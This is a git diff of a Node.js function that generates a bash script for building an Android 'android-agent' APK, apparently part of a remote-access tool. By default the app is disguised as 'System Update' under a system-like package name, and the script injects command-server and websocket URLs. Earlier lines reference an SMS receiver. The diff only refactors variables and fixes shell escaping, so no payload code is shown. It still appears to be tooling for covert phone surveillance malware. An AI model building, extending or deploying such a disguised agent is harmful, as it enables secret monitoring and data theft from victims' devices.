@@ -527,14 +527,19 @@ const APK_TEMPLATE_DIR = path.join(__dirname, '..', 'android-agent');
 // Generate build script for local APK building
 function generateBuildScript(build) {
   const androidAgentPath = path.resolve(__dirname, '..', 'android-agent');
+  const appName = build.name || 'System Update';
+  const pkgName = build.packageName || 'com.android.system.update';
+  const buildId = build.buildId;
+  const serverUrl = build.serverUrl || 'http://localhost:5000';
+  const wsUrl = build.wsUrl || 'http://localhost:5000';
   
   return `#!/bin/bash
 # ========================================
 # APK Builder Script
-# App: ${build.name || 'System Update'}
-# Package: ${build.packageName || 'com.android.system.update'}
-# Build ID: ${build.buildId}
-# Server URL: ${build.serverUrl || 'http://localhost:5000'}
+# App: ${appName}
+# Package: ${pkgName}
+# Build ID: ${buildId}
+# Server URL: ${serverUrl}
 # ========================================
 
 set -e
@@ -544,47 +549,47 @@ GREEN='\\033[0;32m'
 YELLOW='\\033[1;33m'
 NC='\\033[0m'
 
-echo -e "\${GREEN}[*] Building APK: ${build.name}${NC}"
+echo -e "\${GREEN}[*] Building APK: ${appName}\${NC}"
 
 # Check Android SDK
 if [ -z "\$ANDROID_HOME" ] && [ -z "\$ANDROID_SDK_ROOT" ]; then
-    echo -e "\${RED}[!] ANDROID_HOME not set${NC}"
+    echo -e "\${RED}[!] ANDROID_HOME not set\${NC}"
     echo "Set it: export ANDROID_HOME=/path/to/android/sdk"
     exit 1
 fi
 
-echo -e "\${GREEN}[✓] Android SDK found${NC}"
+echo -e "\${GREEN}[✓] Android SDK found\${NC}"
 
 # Navigate to android-agent directory
 SCRIPT_DIR="\$(cd "\$(dirname "\${BASH_SOURCE[0]}")" && pwd)"
 cd "\${SCRIPT_DIR}/android-agent"
 
 if [ ! -f "gradlew" ]; then
-    echo -e "\${RED}[!] android-agent directory not found at: \$(pwd)${NC}"
-    echo -e "\${YELLOW}Please ensure android-agent/ is in the same directory as this script${NC}"
+    echo -e "\${RED}[!] android-agent directory not found at: \$(pwd)\${NC}"
+    echo -e "\${YELLOW}Please ensure android-agent/ is in the same directory as this script\${NC}"
     exit 1
 fi
 
 # Update strings.xml with server URLs
 STRINGS_FILE="app/src/main/res/values/strings.xml"
 if [ -f "\$STRINGS_FILE" ]; then
-    echo -e "\${YELLOW}[*] Updating server URLs...${NC}"
-    # Using sed to replace server URLs
-    if [[ "$OSTYPE" == "darwin"* ]]; then
-        sed -i '' 's|http://10.0.2.2:5000|${build.serverUrl}|g' app/src/main/java/com/android/system/update/services/MainService.kt
-        sed -i '' 's|http://10.0.2.2:5000|${build.serverUrl}|g' app/src/main/java/com/android/system/update/receivers/SmsReceiver.kt
+    echo -e "\${YELLOW}[*] Updating server URLs...\${NC}"
+    # Replace server_url in strings.xml
+    if [[ "\$OSTYPE" == "darwin"* ]]; then
+        sed -i '' 's|<string name="server_url".*</string>|<string name="server_url" translatable="false">${serverUrl}</string>|g' "\$STRINGS_FILE"
+        sed -i '' 's|<string name="ws_url".*</string>|<string name="ws_url" translatable="false">${wsUrl}</string>|g' "\$STRINGS_FILE"
     else
-        sed -i 's|http://10.0.2.2:5000|${build.serverUrl}|g' app/src/main/java/com/android/system/update/services/MainService.kt
-        sed -i 's|http://10.0.2.2:5000|${build.serverUrl}|g' app/src/main/java/com/android/system/update/receivers/SmsReceiver.kt
+        sed -i 's|<string name="server_url".*</string>|<string name="server_url" translatable="false">${serverUrl}</string>|g' "\$STRINGS_FILE"
+        sed -i 's|<string name="ws_url".*</string>|<string name="ws_url" translatable="false">${wsUrl}</string>|g' "\$STRINGS_FILE"
     fi
-    echo -e "\${GREEN}[✓] Server URLs updated${NC}"
+    echo -e "\${GREEN}[✓] Server URLs updated\${NC}"
 fi
 
 # Make gradlew executable
 chmod +x gradlew
 
 # Clean and build
-echo -e "\${YELLOW}[*] Building APK (this may take a few minutes)...${NC}"
+echo -e "\${YELLOW}[*] Building APK (this may take a few minutes)...\${NC}"
 ./gradlew clean assembleDebug
 
 # Check if build succeeded
@@ -593,7 +598,7 @@ if [ -f "\$APK_PATH" ]; then
     echo ""
     echo -e "\${GREEN}========================================"
     echo "  BUILD SUCCESSFUL!"
-    echo "========================================${NC}"
+    echo "========================================\${NC}"
     echo ""
     echo "  APK Location: \$(pwd)/\$APK_PATH"
     echo "  Size: \$(ls -lh "\$APK_PATH" | awk '{print \$5}')"
@@ -605,7 +610,7 @@ else
     echo ""
     echo -e "\${RED}========================================"
     echo "  BUILD FAILED"
-    echo "========================================${NC}"
+    echo "========================================\${NC}"
     echo ""
     echo "  Check the error above or run:"
     echo "  ./gradlew assembleDebug --stacktrace"
